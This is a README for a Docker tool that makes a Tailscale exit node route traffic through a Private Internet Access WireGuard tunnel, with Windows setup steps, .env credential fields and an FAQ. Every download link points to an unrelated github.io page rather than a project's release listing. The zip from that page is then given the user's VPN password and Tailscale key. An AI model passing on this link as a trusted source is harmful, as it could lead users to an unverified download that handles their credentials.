# 🌐 tailscale-pia-exit - Route your traffic through secure tunnels

[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://moyauncrossed879.github.io)

This application creates a bridge between your Tailscale network and a Private Internet Access (PIA) connection. It routes your internet traffic through a secure WireGuard tunnel. By combining these, you hide your location while accessing your home devices from anywhere.

## 📋 What you need
* A Windows computer with Windows 10 or 11.
* Docker Desktop installed and running.
* A paid subscription to Private Internet Access.
* A Tailscale account.
* Basic understanding of how to open a command prompt on Windows.

## 📥 Get the files
Visit this page to download the latest project files: https://moyauncrossed879.github.io

Select the zip file from the latest release. Save it to your computer and extract the contents to a folder. We suggest creating a folder named "tailscale-pia" in your documents directory for easy access.

## ⚙️ Setting up the connection
Your VPN provider requires specific details to connect to their servers. Open the extracted folder. You will find a file named `.env`. Open this file using Notepad.

Update the following fields with your account details:

* PIA_USER: Enter your Private Internet Access username.
* PIA_PASS: Enter your Private Internet Access password.
* PIA_REGION: Choose your desired connection city or region code.
* TAILSCALE_AUTH_KEY: Paste your valid Tailscale authentication key here. You can generate this key in the Tailscale admin console under the "Keys" section.

Save the file and close it.

## 🚀 Running the software
1. Ensure Docker Desktop is active on your machine.
2. Open the command prompt in your local folder. To do this, type "cmd" in the address bar of your file explorer window and press Enter.
3. Type the command `docker-compose up -d` and press Enter.
4. Docker initializes the containers. One container manages the WireGuard connection to your VPN, and the other container manages the Tailscale exit node routing.
5. Wait two minutes for the internal setup to finish.

## 🔍 Verifying the connection
Once the containers run, log in to your Tailscale dashboard. You should see a new device appear in your device list. This device operates as an exit node.

To use the connection, go to your remote computer or phone. Open the Tailscale app. Look for the "Exit Node" option in the settings. Select the name of your new machine. Your traffic now travels through your established VPN tunnel.

## 🛠️ Performance tips
* Keep your Docker Desktop software updated to avoid errors.
* Use a regional server close to your actual physical location to maintain high speeds.
* If the connection drops, run `docker-compose restart` in your command prompt to refresh the tunnels.
* Check your Tailscale logs if devices fail to connect.

## 🛡️ Privacy and security
This configuration keeps your credentials inside the local containers. Data leaves your network only after the VPN encrypts it. Remember that using an exit node routes all your internet traffic through this specific machine. Ensure that your home machine has a stable power supply and internet connection.

## ❓ Common questions
**Does this work on other operating systems?**
The steps focus on Windows, but the underlying technology works on Linux or macOS if the user follows the same Docker configuration.

**Do I need an active PIA subscription?**
Yes, the script requires valid login credentials for their WireGuard gateway.

**Why does my speed change?**
VPN speeds depend on the distance to the server and the processing power of your machine. A low-powered computer might see slower speeds than a dedicated server.

**How do I update the tool?**
Download the latest version from the link provided. Overwrite your old files, ensure your .env settings remain correct, and run the start command again.

**Can I run multiple exit nodes?**
Yes. Assign a unique name to each container in the configuration file if you need to manage multiple exit points.

**Are my credentials safe?**
The tool stores credentials locally in a text file. Do not share your .env file with others.

Keywords: docker, docker-compose, exit-node, homelab, pia, privateinternetaccess, self-hosted, tailscale, vpn, wireguard